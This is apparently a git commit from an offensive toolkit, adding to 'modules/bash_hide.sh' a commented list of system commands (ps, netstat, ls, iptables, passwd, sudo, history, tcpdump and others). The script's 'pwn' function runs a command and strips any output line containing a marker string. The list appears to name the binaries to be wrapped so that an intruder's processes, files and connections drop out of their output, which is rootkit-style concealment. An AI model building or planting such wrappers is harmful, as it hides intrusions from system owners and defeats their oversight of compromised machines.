cfbc8a03b41ce6d5a26353b626ec11be14a22ddb
root <root@kali.local>
2020-08-12 15:32:04 -0400

    add to snippet

--- modules/bash_hide.sh
+++ modules/bash_hide.sh
@@ -4,3 +4,37 @@ function pwn(){
 	`echo "$@"|grep -v THINGTOHIDE 2>&1`;
 }
 pwn "$@"|grep -v THINGTOHIDE
+# files:
+# netstat
+# iptables
+# kill
+# ps
+# pgrep
+# pkill
+# ls
+# rm
+# rmdir
+# passwd
+# shutdown
+# chmod
+# sudo
+# su
+# cat
+# useradd
+# id
+# ln
+# unlink
+# which
+# gpasswd
+# bash
+# sh
+# env
+# echo
+# history
+# tcpdump
+# chattr
+# lsattr
+# export
+# mv
+# grep
+# egrep
